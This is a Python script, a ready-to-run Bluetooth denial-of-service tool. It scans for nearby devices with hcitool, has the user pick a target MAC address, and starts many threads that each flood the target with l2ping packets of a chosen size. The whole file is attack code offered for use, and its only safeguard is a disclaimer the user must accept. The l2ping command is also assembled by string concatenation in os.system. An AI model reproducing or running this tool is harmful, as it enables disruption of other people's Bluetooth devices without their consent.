import os
import threading
import time
import subprocess
from datetime import datetime

LOG_DIR = 'logs'

def create_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def get_log_file():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    return os.path.join(LOG_DIR, f"log_{timestamp}.txt")

def write_to_log(message, log_file):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] {message}"
    with open(log_file, 'a') as f:
        f.write(log_message + '\n')

def DOS(target_addr, packages_size, log_file):
    try:
        os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
        write_to_log(f"DOS attack executed on {target_addr} with package size {packages_size}", log_file)
    except Exception as e:
        error_message = f"Failed to execute DOS attack on {target_addr}: {e}"
        print(error_message)
        write_to_log(error_message, log_file)

def printLogo():
    print('                            Bluetooth DOS Script                            ')

def chooseTarget(array, log_file):
    write_to_log("Choosing target...", log_file)
    print("Choose target:")
    for i, mac in enumerate(array):
        print(f"{i}: {mac}")
    target_choice = input("Enter the index of the target: ")
    try:
        target_index = int(target_choice)
        if 0 <= target_index < len(array):
            selected_target = array[target_index]
            write_to_log(f"Target {selected_target} selected", log_file)
            return selected_target
        else:
            print("Invalid index. Please enter a valid index.")
            write_to_log("Invalid target index entered", log_file)
            return chooseTarget(array, log_file)
    except ValueError:
        print("Invalid input. Please enter a number.")
        write_to_log("Invalid input for target index", log_file)
        return chooseTarget(array, log_file)

def main():
    try:
        create_log_dir()
        log_file = get_log_file()
        printLogo()
        write_to_log("Script started", log_file)
        time.sleep(0.1)
        print('')
        print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
        if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
            time.sleep(0.1)
            os.system('clear')
            printLogo()
            print('')
            print("Scanning ...")
            write_to_log("Scanning for Bluetooth devices...", log_file)
            output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
            lines = output.splitlines()
            id = 0
            del lines[0]
            array = []
            print("|id   |   mac_addres  |   device_name|")
            for line in lines:
                info = line.split()
                mac = info[0]
                array.append(mac)
                print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
                id = id + 1
            target_addr = chooseTarget(array, log_file)
            if len(target_addr) < 1:
                error_message = '[!] ERROR: Target addr is missing'
                print(error_message)
                write_to_log(error_message, log_file)
                exit(0)
            try:
                packages_size = int(input('Packages size > '))
                write_to_log(f"Package size set to {packages_size}", log_file)
            except:
                error_message = '[!] ERROR: Packages size must be an integer'
                print(error_message)
                write_to_log(error_message, log_file)
                exit(0)
            try:
                threads_count = int(input('Threads count > '))
                write_to_log(f"Threads count set to {threads_count}", log_file)
            except:
                error_message = '[!] ERROR: Threads count must be an integer'
                print(error_message)
                write_to_log(error_message, log_file)
                exit(0)
            print('')
            os.system('clear')
            print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
            write_to_log("Starting DOS attack...", log_file)
            for i in range(0, 3):
                print('[*] ' + str(3 - i))
                time.sleep(1)
            os.system('clear')
            print('[*] Building threads...\n')
            write_to_log("Building threads...", log_file)
            for i in range(0, threads_count):
                print('[*] Built thread №' + str(i + 1))
                write_to_log(f"Built thread {i+1}", log_file)
                threading.Thread(target=DOS, args=[str(target_addr), str(packages_size), log_file]).start()
            print('[*] Built all threads...')
            print('[*] Starting...')
        else:
            print('Bip bip')
            exit(0)
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        write_to_log("Script aborted", log_file)
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        error_message = f'[!] ERROR: {str(e)}'
        print(error_message)
        write_to_log(error_message, log_file)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        error_message = f'[!] ERROR: {str(e)}'
        print(error_message)
        exit(1)
